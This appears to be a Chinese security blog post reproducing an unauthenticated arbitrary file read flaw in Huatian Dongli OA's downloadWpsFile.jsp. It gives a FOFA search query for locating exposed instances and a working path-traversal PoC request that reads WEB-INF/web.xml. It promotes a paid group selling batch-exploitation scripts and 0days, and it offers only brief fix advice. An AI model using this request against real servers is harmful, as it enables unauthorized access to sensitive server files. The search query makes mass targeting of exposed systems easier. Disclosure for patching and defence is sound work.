#  「漏洞复现」华天动力OA downloadWpsFile.jsp 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-08-02 19:17  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
华天动力OA是一款将先进的管理思想、 管理模式和软件技术、网络技术相结合，为用户提供了低成本、 高效能的协同办公和管理平台。  
  
0x03  
  
**漏洞威胁**  
  
华天动力OA downloadWpsFile.jsp 接口处存在任意文件读取漏洞，未经身份认证的攻击者可利用此漏洞获取服务器内部敏感文件，使系统处于极不安全的状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="华天动力-OA8000"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0raPIm06OaicUEhicnexl0nAYwOQTV1iaFuJE4W1YowMGXbI0HDg1hGcYFnBby5PCge9FzqibmQ75PIxA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0raPIm06OaicUEhicnexl0nAYAxFJvMCs2bRDzhhbX41DzcuU7yjaoiarcDAVQ3qIdgsZYjEt7F1alrw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0raPIm06OaicUEhicnexl0nAY2gwg9931DgwPUaKfFnBVlqbziaT9roL5xtzNu45bEPc0dAqbNqGickIw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
建议在漏洞修复前尽量避免将系统暴露在互联网上或通过白名单限制访问；  
  
在WAF等安全设备上监测访问URL的中是否包含上述关键词，并严加防护；  
  
及时升级到最新版本：  
```
http://bj.oa8000.com/
```  
  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0raPIm06OaicUEhicnexl0nAY6VWd9SU7d65oJ3ePs1DMYbLCBL5ic8Musia3kByX05AJafiaqbIgtW6oQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0raPIm06OaicUEhicnexl0nAYnJoHxUtSoHtOcu2ld3GA9afDiaouon9FiaFoJ94jaegK6EVFbXHaOnJw/640?wx_fmt=gif&from=appmsg "")  
  
  
